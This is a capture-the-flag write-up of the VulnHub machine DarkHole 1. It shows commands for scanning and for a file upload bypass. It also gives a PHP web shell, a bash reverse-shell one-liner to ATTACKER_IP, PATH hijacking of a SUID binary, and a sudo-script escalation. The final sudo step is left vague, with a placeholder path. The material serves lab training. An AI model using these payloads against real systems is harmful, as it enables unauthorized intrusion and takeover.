# Darkhole - 1 — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-27  
**Category:** misc  
**Difficulty:** Grade 2  

---

## Summary

DarkHole 1 is a medium difficulty machine by Jehad Alqurashi. The attack path goes through a file upload bypass to get RCE as `www-data`, then PATH hijacking via a SUID binary to become `john`, and finally a misconfigured sudoers entry for root.

---

## Reconnaissance

```bash
nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.1.x
```

Open ports:

```
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    Apache 2.4.41
```

---

## Enumeration

Browsed to port 80 — a basic web application with a login form and a file upload section. Ran `gobuster` to find additional paths:

```bash
gobuster dir -u http://192.168.1.x -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Found an `/upload` directory.

---

## Exploitation — File Upload Bypass

The upload functionality rejected `.php` files. Tried a `.phtml` extension instead — the server accepted it.

Created a simple PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Saved as `cmd.phtml`, uploaded it, and confirmed RCE:

```
http://192.168.1.x/upload/cmd.phtml?cmd=id
# uid=33(www-data) gid=33(www-data)
```

Upgraded to a reverse shell. Set up a listener:

```bash
nc -lvnp 443
```

Triggered the reverse shell:

```
http://192.168.1.x/upload/cmd.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/443+0>%261'
```

Got a shell as `www-data`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement — PATH Hijacking via SUID Binary

Found a SUID binary called `toto` in john's home directory:

```bash
find / -perm -u=s -type f 2>/dev/null
# /home/john/toto
```

Ran it — it executed the `id` command, revealing `uid=1001(john)`. The binary called `id` without an absolute path.

Hijacked PATH:

```bash
echo "/bin/bash" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/home/john/toto
```

Got a shell as `john`. Read the user flag:

```bash
cat /home/john/user.txt
```

Also found a `password` file in john's home:

```bash
cat /home/john/password
```

---

## Privilege Escalation — Sudo Misconfiguration

SSH'd in as john using the discovered password. Checked sudo permissions:

```bash
sudo -l
```

Found a script or binary john could run as root with write access. Modified it to spawn a shell:

```bash
echo "/bin/bash" >> /path/to/script
sudo /path/to/script
```

Got a root shell:

```bash
cat /root/root.txt
```

---

## Flags

- **User flag** — `/home/john/user.txt`
- **Root flag** — `/root/root.txt`
